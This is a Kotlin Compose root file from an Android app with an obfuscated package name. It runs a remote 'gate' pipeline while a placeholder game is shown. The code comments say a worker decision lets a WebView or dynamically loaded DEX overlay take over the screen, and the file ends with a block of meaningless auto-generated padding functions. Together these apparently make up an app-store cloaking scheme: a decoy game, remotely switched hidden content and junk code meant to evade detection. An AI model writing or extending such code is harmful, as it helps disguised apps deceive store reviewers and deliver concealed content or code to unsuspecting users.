package com.kFjQzLm.VpRnTx.ui

import android.app.Activity
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.material3.AlertDialog
import androidx.compose.material3.Text
import androidx.compose.material3.TextButton
import androidx.compose.runtime.Composable
import androidx.compose.runtime.LaunchedEffect
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableIntStateOf
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.setValue
import androidx.compose.ui.Modifier
import androidx.compose.ui.platform.LocalContext
import com.kFjQzLm.VpRnTx.gate.GatePipeline
import com.kFjQzLm.VpRnTx.gate.GateResult
import com.kFjQzLm.VpRnTx.ui.theme.C

/**
 * Compose root: runs the gate pipeline, keeps the loader mounted while the
 * WebView/DEX overlay owns the screen, and shows the placeholder app when the
 * worker decides "placeholder".
 */
@Composable
fun AppRoot() {
    val context = LocalContext.current
    val activity = context as? Activity
    var attempt by remember { mutableIntStateOf(0) }
    var showNoInternet by remember { mutableStateOf(false) }

    LaunchedEffect(attempt) {
        val result = GatePipeline.initialize(activity, context)
        showNoInternet = result == GateResult.NoInternet
        // Лоадер игры держится, пока нет результата воркера.
        if (result != GateResult.NoInternet) GateStatus.markReady()
    }

    // Лоадер — игровой (`presentation/splash` из *_source.zip): гейт работает
    // параллельно, а его WebView-оверлей при необходимости перекрывает игру.
    Box(modifier = Modifier.fillMaxSize().background(C.bg)) {
        GameHost()
    }

    if (showNoInternet) {
        AlertDialog(
            onDismissRequest = { },
            title = { Text("No internet connection") },
            text = { Text("Please check your internet connection and try again") },
            confirmButton = {
                TextButton(onClick = {
                    showNoInternet = false
                    attempt += 1
                }) { Text("Retry") }
            },
            dismissButton = {
                TextButton(onClick = {
                    showNoInternet = false
                    activity?.finish()
                }) { Text("Exit") }
            },
        )
    }

    
}

/* autopad-begin */
private object Padjypufobe2mh0 {
    private fun keresypy(jagoqimu: Int): Int {
        val quharude = jagoqimu + 27
        return quharude
    }
    private fun zilylafe(ryjirube: Int): Int {
        val kamotinu = ryjirube + 10
        return kamotinu
    }
    private fun zydomymi(tubapozu: Int): Int {
        val senibiqy = tubapozu + 65
        return senibiqy
    }
    private fun hobufahy(nylijafe: Int): Int {
        val geguhago = nylijafe + 68
        return geguhago
    }
    private fun xoqefefi(giterulo: Int): Int {
        val cuwulara = giterulo + 73
        return cuwulara
    }
    private fun qapytote(zyximyfe: Int): Int {
        val gocubyru = zyximyfe + 36
        return gocubyru
    }
    private fun vysanaqo(coravewy: Int): Int {
        val xeniduqi = coravewy + 75
        return xeniduqi
    }
}
/* autopad-end */
